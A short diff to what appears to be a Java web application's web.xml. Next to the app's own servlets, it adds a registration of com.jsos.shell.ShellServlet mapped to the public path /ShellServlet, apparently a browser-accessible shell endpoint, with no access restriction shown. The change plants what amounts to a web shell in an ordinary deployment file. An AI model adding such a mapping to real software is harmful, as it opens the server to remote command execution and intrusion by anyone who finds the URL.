@@ -9,7 +9,14 @@
     <servlet-name>query</servlet-name>
     <url-pattern>/query/*</url-pattern>
 </servlet-mapping>
-
+<servlet>
+     <servlet-name>ShellServlet</servlet-name>
+     <servlet-class>com.jsos.shell.ShellServlet</servlet-class>
+    </servlet> 
+    <servlet-mapping>
+    <servlet-name>ShellServlet</servlet-name>
+    <url-pattern>/ShellServlet</url-pattern>
+   </servlet-mapping> 
 <servlet>
     <servlet-name>modify</servlet-name>
     <servlet-class>com.yiqingart.www.Modify</servlet-class>
